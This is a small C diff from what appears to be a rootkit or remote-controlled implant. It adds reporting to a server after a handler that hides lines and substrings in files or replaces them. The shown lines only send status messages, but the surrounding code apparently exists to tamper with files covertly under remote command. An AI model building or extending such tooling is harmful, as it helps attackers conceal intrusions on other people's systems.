@@ -177,7 +177,11 @@ static int modify_file_handler(char *args) {
         }
     }
 
-    return alterate_add(path, hide_line, hide_substr, replace_src, replace_dst);
+    if (alterate_add(path, hide_line, hide_substr, replace_src, replace_dst) > 0)
+        send_to_server("Modified: %s\n", path);
+    else
+        send_to_server("Error modifying %s\n", path);
+    return 0;
 }
 
 static int unmodify_file_handler(char *args) {
